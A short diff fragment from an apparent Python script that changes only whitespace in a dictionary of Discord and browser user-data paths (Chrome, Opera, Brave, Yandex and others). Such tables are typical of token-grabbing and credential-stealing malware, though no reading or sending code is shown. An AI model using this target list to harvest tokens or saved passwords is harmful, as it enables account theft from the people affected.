@@ -53,7 +53,7 @@ PATHS = {
 	"Discord PTB"       : ROAMING + "\\discordptb",
 	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
 	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
+	"Opera GX"	    : ROAMING + "\\Opera Software\\Opera GX Stable",
 	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
 	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
 }
